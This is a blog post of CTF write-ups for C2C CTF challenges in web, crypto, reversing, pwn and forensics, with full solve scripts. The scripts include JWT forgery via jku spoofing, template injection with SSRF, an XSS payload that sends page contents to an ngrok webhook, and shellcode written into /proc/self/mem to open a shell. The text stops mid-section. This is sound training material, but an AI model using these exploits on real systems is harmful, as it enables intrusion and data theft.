---
title: "C2C CTF Writeups"
date: 2026-02-16T02:00:00+07:00
toc: true
toc_sticky: true
categories:
  - blog
tags:
  - CTF
  - Writeup
layout: single

---
{% raw %}
# C2C CTF Writeups

Unexpectedly interesting challenges from C2C CTF. Here are the detailed writeups for the challenges we solved, covering Web, Crypto, Reverse Engineering, Pwn, Forensics, Blockchain, and Misc categories.

---

## Web

### Clicker (100 pts)

**Challenge Description**
Clicker is a file management application that allows users to upload, download, and manage files. It uses RS256 JWTs for authentication and validation. The goal is to bypass potential restrictions and read the flag file.

**Vulnerability Analysis**
The application contains a chain of vulnerabilities:
1.  **JKU Spoofing**: The JWT verification process (`verify_token` in `utils/jwt_utils.py`) trustingly fetches the public key from the URL specified in the `jku` (JSON Web Key Set URL) header of the token.
2.  **SSRF / Filter Bypass**: The `jku` validation allows `localhost` but attempts to filter internal IPs. However, it can be bypassed using URL formatting tricks (e.g., `user@localhost@attacker.com`).
3.  **Curl Injection / Globbing**: The `admin` download feature (`/api/admin/download`) uses `subprocess.run(['curl', ...])`. It blocks the `file://` protocol but fails to account for curl's globbing feature. Inputting `{file}:///flag.txt` bypasses the string check but is expanded by curl to `file:///flag.txt`.

**Exploitation Steps**
1.  **Host Malicious Keys**: Generate a fresh RSA key pair and a JWKS file containing the public key. Host this JWKS on a public server (or use `ngrok` to expose a local server).
2.  **Forge JWT**: Create a JWT signed with your private key. Set the `jku` header to your hosted JWKS URL. To bypass the validation, format the URL as `http://user@localhost@<your-ngrok-host>/jwks.json`.
3.  **Authenticate**: Use the forged token to authenticate as an admin user.
4.  **Exploit Curl**: Send a POST request to `/api/admin/download` with the URL `"{file}:///flag.txt"` (or similar path depending on flag location).
5.  **Retrieve Flag**: The server will use curl to fetch the local file and save it to the static directory, allowing you to download it.

**Solution Code**
```python
import jwt
import datetime
import requests
import time
import threading
import os
import sys
import json
import base64
from pyngrok import ngrok
import http.server
import socketserver
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

# Challenge Target
HOST_IP = "challenges.1pc.tf"
TARGET_PORT = 41846
TARGET_URL = f"http://{HOST_IP}:{TARGET_PORT}"

# Local Exploit Server
LOCAL_PORT = 8000

# Fix for datetime.UTC in older python versions
if not hasattr(datetime, 'UTC'):
    datetime.UTC = datetime.timezone.utc

def int_to_base64(n):
    n_bytes = n.to_bytes((n.bit_length() + 7) // 8, byteorder='big')
    encoded = base64.urlsafe_b64encode(n_bytes).rstrip(b'=').decode('utf-8')
    return encoded

def generate_keys_and_jwks():
    print("[*] Generating ephemeral RSA keys...")
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
    )
    
    private_pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.NoEncryption()
    )
    
    public_key = private_key.public_key()
    public_numbers = public_key.public_numbers()
    
    jwks_data = {
        "keys": [
            {
                "kty": "RSA",
                "kid": "exploit_key",
                "use": "sig",
                "alg": "RS256",
                "n": int_to_base64(public_numbers.n),
                "e": int_to_base64(public_numbers.e)
            }
        ]
    }
    
    with open('exploit_jwks.json', 'w') as f:
        json.dump(jwks_data, f)
        
    return private_pem

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/jwks.json':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            if os.path.exists('exploit_jwks.json'):
                with open('exploit_jwks.json', 'rb') as f:
                    self.wfile.write(f.read())
            else:
                self.wfile.write(b'{}')
        else:
            self.send_error(404)
    
    def log_message(self, format, *args):
        pass # Silence logs

def start_server():
    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer(("", LOCAL_PORT), Handler) as httpd:
        print(f"[*] Local server serving at port {LOCAL_PORT}")
        httpd.serve_forever()

def solve():
    private_key_pem = generate_keys_and_jwks()

    server_thread = threading.Thread(target=start_server)
    server_thread.daemon = True
    server_thread.start()
    
    print("[*] Starting ngrok tcp tunnel...")
    public_url = None
    try:
        tunnel = ngrok.connect(LOCAL_PORT, "tcp")
        public_url = tunnel.public_url
        print(f"[+] Ngrok Tunnel Created: {public_url}")
    except Exception as e:
        print(f"[-] Ngrok failed: {e}")
        return

    if public_url.startswith("tcp://"):
        netloc = public_url.replace("tcp://", "")
    else:
        netloc = public_url.replace("http://", "").replace("https://", "")

    jku_url = f"http://user@localhost@{netloc}/jwks.json"
    print(f"[*] Constructed JKU URL: {jku_url}")

    print("[*] Generating Admin Token...")
    payload = {
        'user_id': 1337,
        'username': 'admin_hacker',
        'is_admin': True,
        'exp': datetime.datetime.now(datetime.UTC) + datetime.timedelta(hours=1),
        'jku': jku_url
    }
    
    headers = { 'kid': 'exploit_key' }
    token = jwt.encode(payload, private_key_pem, algorithm='RS256', headers=headers)
    
    print("[*] Sending Exploit Request to Target...")
    headers_req = { 'Authorization': f'Bearer {token}', 'Content-Type': 'application/json' }
    
    data = {
        'url': "{file}:///flag.txt",
        'filename': "flag_exploit.txt",
        'type': 'text',
        'title': 'flag'
    }
    
    try:
        res = requests.post(f"{TARGET_URL}/api/admin/download", json=data, headers=headers_req, timeout=30)
        print(f"[*] Response Status: {res.status_code}")
        
        if res.status_code == 200:
            print("[+] Download successful! Retrieving content...")
            file_url = f"{TARGET_URL}/static/flag_exploit.txt"
            res_file = requests.get(file_url, headers=headers_req)
            if res_file.status_code == 200:
                print(f"[+] Content Retrieved:\n{res_file.text}")
            else:
                print(f"[-] Failed to retrieve file content. Status: {res_file.status_code}")
        else:
            print(f"[-] Exploit failed. Response: {res.text}")
            
    except Exception as e:
        print(f"[-] Request Error: {e}")

    ngrok.disconnect(public_url)
    time.sleep(1)
    os._exit(0)

if __name__ == "__main__":
    solve()
```

**Flag**
`C2C{p4rs3r_d1sr4p4ncy_4nd_curl_gl0bb1ng_1s_my_f4v0r1t3_0f89c517a261}`

---

### Corp-Mail (100 pts)

**Challenge Description**
A corporate email system allowing registration and login. It uses JWT for authentication and HAProxy for access control.

**Vulnerability Analysis**
1.  **Format String / Config Leak**: The `format_signature` function uses `str.format()` on user input. This allows accessing global objects like `current_app.config` via `{app.config}`, leaking the `JWT_SECRET`.
2.  **HAProxy Bypass**: HAProxy restricts access to `/admin`. However, Flask normalizes URLs differently than HAProxy. A request to `/%2fadmin` bypasses the HAProxy rule (which looks for `/admin`) but is normalized by Flask to `/admin`.
3.  **IDOR**: The admin email viewer lacks authorization checks for specific email IDs.

**Exploitation Steps**
1.  **Leak Secret**: 
    *   Log in and go to Settings.
    *   Set your signature to `{app.config}`.
    *   View your signature to see the dumped configuration, including `JWT_SECRET`.
2.  **Forge Admin Token**:
    *   Sign a new JWT with the leaked secret.
    *   Set `is_admin=True` (or `1`) in the payload.
3.  **Bypass Access Control**:
    *   Replace your session cookie with the forged token.
    *   Navigate to `/%2fadmin` to access the admin panel.
4.  **Extract Flag**:
    *   Use the IDOR in the email viewer (`/admin/email/<id>`) to brute-force email IDs until you find the one containing the flag.

**Solution Code**
```python
import requests
import re
import datetime
import jwt # pyjwt
import html

BASE_URL = "http://challenges.1pc.tf:22042"

def register_and_login(s):
    username = "attacker" + datetime.datetime.now().strftime("%H%M%S")
    password = "password123"
    email = f"{username}@example.com"
    r = s.post(f"{BASE_URL}/register", data={
        "username": username,
        "password": password,
        "confirm_password": password,
        "email": email
    })
    
    # Login
    r = s.post(f"{BASE_URL}/login", data={
        "username": username,
        "password": password
    })
    if "Invalid credentials" in r.text or "Log In" in r.text or r.status_code != 302:
        if r.url.endswith("/inbox"):
             return True
        print(f"Login failed. Status: {r.status_code}, URL: {r.url}")
        return False
    return True

def leak_secret(s):
    # Update signature to leak config
    payload = "{app.config}"
    print(f"Setting signature to: {payload}")
    r = s.post(f"{BASE_URL}/settings", data={
        "signature": payload
    })
    
    if "Signature updated successfully" not in r.text:
        print("Failed to update signature")
        return None
        
    print("Signature updated. Fetching settings page...")
    r = s.get(f"{BASE_URL}/settings")
    
    # Unescape HTML
    text = html.unescape(r.text)
    
    # Get secret from response
    if "JWT_SECRET" in text:
        secret_match = re.search(r"'JWT_SECRET': '([^']+)'", text)
        algo_match = re.search(r"'JWT_ALGORITHM': '([^']+)'", text)
        
        algo = "HS256"
        if algo_match:
            algo = algo_match.group(1)
            print(f"Algorithm found: {algo}")
        else:
             print("Algorithm not found in config, using default HS256")

        if secret_match:
            return secret_match.group(1), algo
    return None, None

def forge_token(secret, algo='HS256'):
    payload = {
        'user_id': 1, # Admin is likely 1
        'username': 'admin',
        'is_admin': 1,
        'exp': datetime.datetime.utcnow() + datetime.timedelta(hours=24)
    }
    token = jwt.encode(payload, secret, algorithm=algo)
    return token

def get_flag(s):
    prefixes = ["/%2fadmin"]
    working_prefix = "/%2fadmin"
        
    print(f"Brute forcing emails with prefix {working_prefix}...")
    token = s.cookies.get("token")
    
    for i in range(1, 25):
        url = f"{BASE_URL}{working_prefix}/email/{i}"
        if token:
            cookies = {'token': token}
            r = s.get(url, cookies=cookies)
        else:
            r = s.get(url)
            
        if "C2C{" in r.text:
            print(f"Found flag in email {i}")
            match = re.search(r"C2C\{[^}]+\}", r.text)
            if match:
                return match.group(0)
    return None

if __name__ == "__main__":
    s = requests.Session()
    if register_and_login(s):
        print("Logged in")
        secret, algo = leak_secret(s)
        if secret:
            print(f"Leaked secret: {secret}")
            token = forge_token(secret, algo)
            
            s.cookies.clear()
            s.cookies.set("token", token)
            
            flag = get_flag(s)
            if flag:
                print(f"FLAG: {flag}")
            else:
                print("Flag not found")
        else:
            print("Failed to leak secret")
```

**Flag**
`C2C{f0rm4t_str1ng_l34k5_4nd_n0rm4l1z4t10n_fc0b7f7463de}`

---

### The Soldier of God, Rick (100 pts)

**Challenge Description**
A Go web application where you fight a boss. It uses `html/template` and exposes an internal endpoint.

**Vulnerability Analysis**
1.  **SSTI**: The application uses `fmt.Sprintf` to insert user input (`battle_cry`) into a template string *before* parsing it. This allows arbitrary template injection.
2.  **SSRF**: The template context exposes a `.Rick.Scout` method that can make HTTP GET requests.
3.  **Integer Overflow**: The internal endpoint `/internal/offer-runes` takes an `amount`. It converts this to `int64`, checks if it's positive, but then casts it to `int32` when deducting from HP. Sending `2^31 + 1` (2147483649) overflows to a large negative number, instantly killing the boss.

**Solution Code**
```python
import requests
import sys
import re

if len(sys.argv) < 2:
    print(f"Usage: python3 {sys.argv[0]} <target_url>")
    sys.exit(1)

TARGET = sys.argv[1]
SECRET = "Morty_Is_The_Real_One"

# SSTI payload:
SSRF_URL = "http://127.0.0.1:8080/internal/offer-runes?amount=2147483649"
BATTLE_CRY = '{{ .Rick.Scout "' + SSRF_URL + '" }}{{ .Secret }}'

print(f"[*] Target: {TARGET}")
print(f"[*] Payload: {BATTLE_CRY}")

resp = requests.post(
    f"{TARGET}/fight",
    data={
        "secret": SECRET,
        "battle_cry": BATTLE_CRY,
    },
)

print(f"[*] Status: {resp.status_code}")
print(resp.text)

# Look for common flag patterns
for pattern in [r'C2C\{[^}]+\}', r'flag\{[^}]+\}', r'CTF\{[^}]+\}']:
    matches = re.findall(pattern, resp.text, re.IGNORECASE)
    if matches:
        print(f"\n[+] FLAG FOUND: {matches[0]}")
        break
```

**Flag**
`C2C{R1ck_S0ld13r_0f_G0d_H4s_F4ll3n_v14_SST1_SSR7_4b5b915f89de}`

---

### Unsafe Notes (504 pts)

**Challenge Description**
A note-taking app vulnerable to DOM Clobbering and Login CSRF.

**Vulnerability Analysis**
1.  **DOM Clobbering**: The `domiso` 0.1.1 sanitizer library has a known bypass using DOM Clobbering. By injecting a form with an input named `attributes`, we can trick the sanitizer into checking the input element instead of the form's actual attributes.
2.  **Login CSRF**: The login endpoint has no CSRF protection.

**Solution Code**
```python
from flask import Flask, request
from pyngrok import ngrok
import threading
import requests
import base64
import time
import os
import random
import string

PORT = 5001
app = Flask(__name__)
HOST = "http://challenges.1pc.tf:33084/"

req = requests.Session()
username = "".join(random.choices(string.ascii_letters, k=10))
password = "".join(random.choices(string.ascii_letters, k=10))
req.post(HOST + "api/auth/register", json={"username": username, "password": password})

def save_payload(public_url):
    cmd = f"fetch('{public_url}/webhook?flag='+opener.document.body.innerText)"
    cmd = base64.b64encode(cmd.encode()).decode()
    xss = f"<form id=x style=display:block;content-visibility:auto oncontentvisibilityautostatechange=eval(atob('{cmd}'))><input name=attributes><input name=attributes></form>"
    req.post(HOST + "api/notes", json={"title": "xss", "content": xss})

@app.route("/")
def index():
    return """<script>setTimeout(() => { window.location = 'http://localhost/api/notes'; }, 1000); open('exploit');</script>"""

@app.route("/exploit")
def exploit():
    return """<script>setTimeout(() => { window.location = 'http://localhost/'; }, 2000); open('csrf');</script>"""

@app.route("/csrf")
def csrf():
    return f"""<form action="http://localhost/api/auth/login" method="POST"><input type="text" name="username" value="{username}"><input type="text" name="password" value="{password}"><input type="submit"></form><script>setTimeout(() => {{ document.querySelector('form').submit(); }}, 500);</script>"""

@app.route("/webhook", methods=["GET"])
def webhook():
    flag = request.args.get("flag")
    if "C2C{" in flag:
        with open("flag.txt", "w") as f:
            f.write(flag)
        threading.Timer(1.0, lambda: os._exit(0)).start()
    return {"status": "ok"}

def run_flask():
    app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False)

if __name__ == "__main__":
    threading.Thread(target=run_flask).start()
    public_url = ngrok.connect(PORT, proto="tcp").public_url.replace("tcp://", "http://")
    save_payload(public_url)
    print(f"[*] Exploit URL: {public_url}")
    visit_url = HOST + f"visit?url={public_url}"
    while True:
        try: requests.get(visit_url, timeout=2)
        except Exception: pass
        time.sleep(10)
```

**Flag**
`C2C{you_are_right_it_is_indeed_very_unsafe_1698141b1832}`

---

### AIC Gachapon

**Challenge Description**
A .NET web app using `System.Random`.

**Vulnerability Analysis**
The app uses `System.Random`. In .NET Core/5+, this uses a predictable Knuth subtractive generator (Lag-55). We can read raw outputs (`sampleInts`) from the API.

**Exploitation Steps**
1.  **Harvest**: Collect ~30 frames of data.
2.  **Reconstruct State**: Populate the Lag-55 buffer from the observed outputs. Use the recurrence relation $x_n = (x_{n-55} - x_{n-34}) \pmod{MBIG}$ to fill gaps.
3.  **Predict**: Step the generator forward to predict the next "Redeem Code".
4.  **Redeem**: Submit the code to get the flag.

**Solution Code**
```python
import requests
import sys

SERVER = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"
MBIG = 2147483647

def get_recent(n=30):
    r = requests.get(f"{SERVER}/api/recent/{n}")
    return r.json()

def redeem(tick_id, code):
    r = requests.post(f"{SERVER}/api/redeem", json={"tickId": tick_id, "code": code})
    return r.json()

def solve():
    print(f"[*] Connecting to {SERVER}")
    frames = get_recent(30)
    frames.sort(key=lambda x: x['tickId'])
    
    num_frames = len(frames)
    total_samples = num_frames * 25
    s = [None] * total_samples
    
    for i, f in enumerate(frames):
        offset = i * 25 + 4
        for j, val in enumerate(f['sampleInts']):
            s[offset + j] = val
            
    # Lag-34 Solve
    changed = True
    while changed:
        changed = False
        for n in range(55, total_samples):
            if s[n] is None and s[n-55] is not None and s[n-34] is not None:
                val = (s[n-55] - s[n-34]) % MBIG
                if val == MBIG: val -= 1
                s[n] = val
                changed = True

    # Predict
    last_tick = frames[-1]['tickId']
    next_tick = last_tick + 1
    
    # Extend state
    s.extend([None]*50)
    for n in range(total_samples, total_samples + 50):
        if n >= 55 and s[n-55] is not None and s[n-34] is not None:
             val = (s[n-55] - s[n-34]) % MBIG
             if val == MBIG: val -= 1
             s[n] = val

    target = num_frames * 25 + 24
    if target < len(s) and s[target] is not None:
         code = int(s[target] * (1.0/MBIG) * 10000000)
         print(f"[*] Predict NEXT Tick {next_tick}: {code}")
         res = redeem(next_tick, code)
         print(f"Result: {res}")

if __name__ == "__main__":
    solve()
```

**Flag**
`C2C{0a0628bc8d88}`

---

## Crypto

### Tet (101 pts)

**Challenge Description**
A custom cryptosystem running 12 rounds. We are given `N`, `a/b mod N`, `f = e*M + c`, `z`, `g`, `U2`.

**Vulnerability Analysis**
1.  **Small a, b**: `a` and `b` generated with 1000 bits while `N` is 2048 bits. `val_ab = a * b^-1 mod N`. We can use **Rational Reconstruction** to recover `a` and `b`.
2.  **Linear Leak (HNP)**: `f = e * M1 + c`. `M1` is constant. `e` and `c` allow formulating this as a Hidden Number Problem. We can use LLL (Lattice Reduction) to recover `M1`.
3.  **Factorization**: Knowing `e` (from HNP), `e * d = 1 mod phi`. Using **Continued Fractions** on `e/N^3` (approx ratio), we can recover `d` aka the factorization.

**Solution Code**
```python
from pwn import *
from Crypto.Util.number import getPrime, inverse, long_to_bytes
import math
from math import gcd
from fpylll import IntegerMatrix, LLL

def solve_ab(val, N):
    limit = math.isqrt(N)
    r0, r1 = N, val
    t0, t1 = 0, 1
    
    while r1 > limit:
        q = r0 // r1
        r0, r1 = r1, r0 - q * r1
        t0, t1 = t1, t0 - q * t1
        
    a = r1
    b = abs(t1)
    
    if (b * val) % N == a:
        return a, b
    return None, None

def integer_cbrt(n):
    if n < 0: return -integer_cbrt(-n)
    if n == 0: return 0
    low = 0
    high = 1 << ((n.bit_length() + 2) // 3)
    while low < high:
        mid = (low + high + 1) // 2
        if mid**3 <= n:
            low = mid
        else:
            high = mid - 1
    return low

def solve_d_factor_N(e, N, a, b):
    n, d_val = e, N**3
    numerators = [0, 1]
    denominators = [1, 0]
    BITS = N.bit_length() // 2
    
    while True:
        if d_val == 0: break
        q_val = n // d_val
        n, d_val = d_val, n % d_val
        num = q_val * numerators[-1] + numerators[-2]
        den = q_val * denominators[-1] + denominators[-2]
        numerators.append(num)
        denominators.append(den)
        
        if den.bit_length() > BITS + 50:
            break
            
        candidate_k = num
        candidate_d = den
        if candidate_k == 0: continue
            
        computed_phi = (e * candidate_d - 1) // candidate_k
        K = computed_phi - a*b - N**3
        delta = K**2 - 4 * b * a * N**3
        
        if delta >= 0:
            is_square = False
            try:
                sqrt_delta = math.isqrt(delta)
                if sqrt_delta * sqrt_delta == delta:
                    is_square = True
            except: pass
            
            if is_square:
                x1 = (-K + sqrt_delta) // (2*b)
                x2 = (-K - sqrt_delta) // (2*b)
                for x in [x1, x2]:
                    if x <= 0: continue
                    p_cand = integer_cbrt(x)
                    if p_cand**3 == x and N % p_cand == 0:
                        q_cand = N // p_cand
                        return candidate_d, p_cand, q_cand
    return None, None, None

def solve_e_lattice(fs):
    candidates_M = [6705, 6710, 6715, 6700, 6720]
    for LIMIT_BITS in candidates_M:
        M = 1 << LIMIT_BITS
        dim = len(fs)
        basis = []
        row0 = [1]
        for i in range(1, dim):
            val = (fs[i] * M) // fs[0]
            row0.append(val)
        basis.append(row0)
        for i in range(1, dim):
            row = [0] * dim
            row[i] = M
            basis.append(row)
            
        mat = IntegerMatrix.from_matrix(basis)
        LLL.reduction(mat, delta=0.99)
        
        for i in range(mat.nrows):
            row = list(mat[i])
            val = abs(row[0])
            if val.bit_length() > 6100 and val.bit_length() < 6200:
                rem = fs[0] % val
                if rem.bit_length() <= 6020:
                    return val
    return None

def main():
    try: sys.set_int_max_str_digits(50000)
    except: pass
    io = remote("challenges.1pc.tf", 28780)
    rounds_data = []
    
    for i in range(1, 13):
        io.recvuntil(f"=== Round {i}/12 ===".encode())
        io.recvuntil(b"N = "); N = int(io.recvline().strip(), 16)
        io.recvuntil(b"a/b = "); val_ab = int(io.recvline().strip(), 16)
        io.recvuntil(b"f = "); f = int(io.recvline().strip(), 16)
        io.recvuntil(b"z = "); z = int(io.recvline().strip(), 16)
        io.recvuntil(b"g = "); g = int(io.recvline().strip(), 16)
        io.recvuntil(b"U2 = "); U2 = int(io.recvline().strip(), 16)
        rounds_data.append({'i': i, 'N': N, 'val_ab': val_ab, 'f': f, 'z': z, 'g': g, 'U2': U2})
        print(f"Collected Round {i}")

    for r in rounds_data:
        r['a'], r['b'] = solve_ab(r['val_ab'], r['N'])

    fs = [r['f'] for r in rounds_data]
    e1 = solve_e_lattice(fs)
    print(f"Recovered e1: {e1}")
    M1_candidate = rounds_data[0]['f'] // e1
    
    guesses = []
    for r in rounds_data:
        e = r['f'] // M1_candidate
        d, p, q = solve_d_factor_N(e, r['N'], r['a'], r['b'])
        phi_N = (p-1)*(q-1)
        d_inv = inverse(d, r['N'] * phi_N)
        base = pow(r['U2'], d_inv, r['N']**2)
        s = base % r['N']
        guesses.append(s)

    for g_val in guesses:
        io.sendlineafter(b">> ", str(g_val).encode())
        io.recvline()
            
    print(io.recvall().decode())

if __name__ == "__main__":
    main()
```

---

### BigGuy (100 pts)

**Challenge Description**
AES-CTR encryption service. Users can provide an IV, but a "plagiarism check" rejects IVs that are too similar (diff <= 3 bytes) to the hidden `big_guy` IV.

**Vulnerability Analysis**
AES-CTR uses a counter initialized by the IV. If two IVs are close numbers, their counter sequences will overlap.
The plagiarism check `diff > 3 bytes` is weak. We can flip the Least Significant Bits of the last 3 bytes. This makes the IVs differ by 3 bytes (passing check) but keeps the integer values very close.

**Solution Code**
```python
from pwn import *
import json
import ast

def solve():
    context.log_level = 'info'
    p = remote('challenges.1pc.tf', 32931)
    
    # Read initial
    while True:
        try: line = p.recvline().decode().strip()
        except: break
        if line.startswith('spongebob'): break
            
    list_str = line[line.find('['):line.find(']')+1]
    big_guy = eval(list_str)
    
    flag1_line = p.recvline().decode().strip()
    flag1_ct = bytes.fromhex(flag1_line.split('=')[1].strip().strip("'"))
    
    target_indices = [13, 14, 15]
    v = list(big_guy)
    for idx in target_indices:
        v[idx] ^= 1
        
    max_blocks = 70000 
    total_len = max_blocks * 16 + len(flag1_ct)
    plaintext = 'A' * total_len
    
    req = {"options": "encrypt", "plaintext": plaintext, "iv": v}
    json_req = json.dumps(req)
        
    chunk_size = 4096
    for i in range(0, len(json_req), chunk_size):
        p.send(json_req[i:i+chunk_size])
    p.send(b'\n')
    
    while True:
        line_bytes = p.recvuntil(b'\n').strip()
        resp = line_bytes.decode(errors='ignore')
        if resp.startswith("ct_big"): break
            
    ct_hex_part = resp.split('=', 1)[1].strip()
    ct_big = ast.literal_eval(ct_hex_part)

    def decrypt_at_offset(ciphertext, known_ct, offset):
        try:
            decrypted = bytearray()
            for i in range(len(known_ct)):
                decrypted.append(known_ct[i] ^ ciphertext[offset+i] ^ 0x41) 
            return bytes(decrypted)
        except: return None

    # Scan loop
    for k in range(max_blocks):
        offset = k * 16
        if offset + 4 > len(ct_big): break
        try:
            c0 = flag1_ct[0] ^ ct_big[offset] ^ 0x41
            c1 = flag1_ct[1] ^ ct_big[offset+1] ^ 0x41
            c2 = flag1_ct[2] ^ ct_big[offset+2] ^ 0x41
            c3 = flag1_ct[3] ^ ct_big[offset+3] ^ 0x41
            
            if bytes([c0, c1, c2, c3]) == b'C2C{':
                flag1 = decrypt_at_offset(ct_big, flag1_ct, offset)
                print(f"FLAG: {flag1}")
                break
        except: continue
    p.close()

if __name__ == "__main__":
    solve()
```

**Flag**
`C2C{part1_checking_reused_ctr_part2_checking_reused_ctr}`

---

## Reverse Engineering

### Bunaken (100 pts)

**Challenge Description**
We are provided with two files:
*   `bunaken`: A binary executable.
*   `flag.txt.bunakencrypted`: An encrypted file containing the flag.

The goal is to reverse the binary to find the decryption key/algorithm.

**Reversing Steps**
1.  **Identification**:
    *   Running `file bunaken` reveals it's a 64-bit ELF executable.
    *   Running `strings bunaken | grep "bun"` shows many Bun-related strings, indicating it's a standalone Bun runtime application with bundled JavaScript.

2.  **Extraction**:
    *   Bun standalone binaries append the user's JavaScript payload to the end of the runtime.
    *   We used `tail -n 20 bunaken` (or a hex editor) to find the start of the payload, which begins with `// @bun` and a large JavaScript array.
    *   We copied this JavaScript content to `bunaken_source.js`.

3.  **Deobfuscation**:
    *   The JavaScript usage a common obfuscation technique: a large string array `w` and a rotation IIFE that shuffles it until a checksum matches.
    *   There were two decoder functions `l(n)` and `c(n, key)`. `l` shifts the index, `c` decrypts using RC4/XOR.
    *   By evaluating these functions (e.g., `console.log(s(391, "9Dnx"))`), we resolved strings like "file", "flag.txt", and "sulawesi".

**Vulnerability Analysis**
The recovered logic revealed:
1.  **Key Derivation**: `passphrase = "sulawesi"`. The key is the first 16 bytes of `SHA-256("sulawesi")`.
2.  **Encryption**: `AES-CBC` with a random IV.
3.  **Compression**: The plaintext was compressed with Zstd (`Bun.zstdCompress`) *before* encryption.

**Solution Code**
```python
import base64
import hashlib
import zstandard as zstd
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

def decrypt():
    with open("flag.txt.bunakencrypted", "r") as f:
        enc_data_b64 = f.read().strip()

    enc_data = base64.b64decode(enc_data_b64)
    iv = enc_data[:16]
    ciphertext = enc_data[16:]

    key_hash = hashlib.sha256(b"sulawesi").digest()
    key = key_hash[:16]

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_padded = decryptor.update(ciphertext) + decryptor.finalize()

    dctx = zstd.ZstdDecompressor()
    try:
        flag_bytes = dctx.decompress(decrypted_padded)
        print(f"Flag: {flag_bytes.decode('utf-8')}")
    except:
        # manual unpad if needed
        pad_len = decrypted_padded[-1]
        unpadded = decrypted_padded[:-pad_len]
        flag_bytes = dctx.decompress(unpadded)
        print(f"Flag: {flag_bytes.decode('utf-8')}")

if __name__ == "__main__":
    decrypt()
```

**Flag**
`C2C{BUN_AwKward_ENcryption_compression_obfuscation}`

---

## Pwn

### NS3

**Challenge Description**
C++ HTTP Server with file access, vulnerable to Path Traversal and RCE via `proc` filesystem abuse.

**Vulnerability Analysis**
1.  **Path Traversal**: `process_get` and `process_put` accept paths like `../../`.
2.  **Arbitrary Read/Write**: We can read `/proc/self/maps` and write to `/proc/self/mem`.
3.  **RCE**: Writing to `/proc/self/mem` allows bypassing W^X by overwriting executable code (TEXT segment) with shellcode.

**Solution Code**
```python
import requests
from pwn import *
import time

context.arch = 'amd64'
context.os = 'linux'
HOST = 'challenges.1pc.tf'
PORT = 23158

def pwn_exploit():
    # 1. Leak Maps
    r = remote(HOST, PORT)
    r.sendline(b'GET /?path=../../../../proc/self/maps HTTP/1.1\r\nHost: localhost\r\n\r\n')
    maps = r.recvall(timeout=2)
    
    # Parse maps to find base address
    base_addr = 0
    lines = maps.splitlines()
    for line in lines:
        if b'server' in line and b'r--p' in line:
            base_addr = int(line.split(b'-')[0], 16)
            break

    if base_addr == 0: return

    # 3. Send Shellcode
    # offset calculated from binary analysis
    target_addr = base_addr + 0x1234 
    r.close()
    
    r = remote(HOST, PORT)
    shellcode = asm("""
        xor rbx, rbx
        mov bl, 3
    loop_fds:
        cmp bl, 10
        jg exec_sh
        mov rax, 33; mov rdi, rbx; xor rsi, rsi; syscall
        mov rax, 33; mov rdi, rbx; mov rsi, 1; syscall
        mov rax, 33; mov rdi, rbx; mov rsi, 2; syscall
        inc rbx; jmp loop_fds
    exec_sh:
        mov rax, 59
        lea rdi, [rip+binsh]
        xor rsi, rsi
        xor rdx, rdx
        syscall
    binsh: .string "/bin/sh"
    """)
    
    req = f'PUT /?path=../../../../proc/self/mem&offset={target_addr} HTTP/1.1\r\n'
    req += f'Host: {HOST}\r\nContent-Length: {len(shellcode)}\r\nConnection: keep-alive\r\n\r\n'
    
    r.send(req.encode() + shellcode)
    time.sleep(1)
    
    r.sendline(b'cat /flag*')
    print(r.recvall(timeout=5).decode(errors='ignore'))
    r.close()

if __name__ == "__main__":
    pwn_exploit()
```

**Flag**
`C2C{lINux_Fi1e_SyS7Em_1S_qU1te_MlND_8lowlng_l5n't_lT_9f614b3b839b?}`

---

## Forensics

### Log (100 pts)

**Challenge Description**
Analyze Apache access/error logs from a compromised WordPress site to identify the attacker and recovered stolen data.

**Forensics Steps**
1.  **Identify Attacker**:
    *   We analyzed the `access.log` to find the most active IP.
    *   Command: `awk '{print $1}' access.log | sort | uniq -c | sort -nr | head -n 5`
    *   Result: `219.75.27.16` found with thousands of hits.
2.  **Attack Reconstruction**:
    *   Grepping for the IP and common exploit keywords (`UNION`, `SELECT`) revealed a **Time-Based Blind SQL Injection**.
    *   Command: `grep "219.75.27.16" access.log | grep "SLEEP"`
3.  **Data Recovery**:
    *   The attack used boolean inference (`IF(ORD(MID(..., i, 1)) != char, SLEEP(5), 0)`).
    *   We parsed the logs to find entries where the response time was normal (indicating the condition was FALSE, i.e., `char == guess`) or where it timed out/slept (indicating TRUE). By reconstructing the characters one by one, we recovered the flag.

**Recovered Data**
Email: `admin@daffainfo.com`
Hash: `$wp$2y$10$vMTERqJh2IlhS.NZthNpRu/VWyhLWc0ZmTgbzIUcWxwNwXze44SqW`

**Flag**
`C2C{7H15_15_V3rY_345Y_3f968f28ffa4}`

---

### Tattletale

**Challenge Description**
A forensics challenge involving a Linux keylogger. We are provided with a PyInstaller-packed executable (`serizawa`), a captured data file (`cron.aseng`), and an encrypted file (`whatisthis.enc`).

**Investigation**
1.  **Malware Analysis**:
    *   `file serizawa` identified it as an ELF executable.
    *   `pyinstxtractor.py` was used to unpack it.
    *   Decompiling `serizawa.pyc` revealed the logic: it captures Linux input events from `/dev/input/event0` and writes `struct` data to `/opt/cron.aseng`.
2.  **Log Analysis**:
    *   We parsed `cron.aseng` using Python's `struct` module (Format `QQHHi`).
    *   Reconstructed keystrokes show the attacker running: `openssl enc -aes-256-cbc ... -pass pass:4_g00d_fr13nD_in_n33D`.
3.  **Decryption**:
    *   We used the recovered password to decrypt `whatisthis.enc`.
    *   The output was an octal dump, which we reversed to get the flag.

**Flag**
`C2C{it_is_just_4_very_s1mpl3_l1nuX_k3ylogger_xixixi_haiyaaaaa_ez}`

---

### React

**Challenge Description**
Analyzing a network packet capture (`network.pcap`) to investigate an intrusion involving a Next.js application and TrevorC2 malware.

**Investigation**
1.  **Traffic Analysis**:
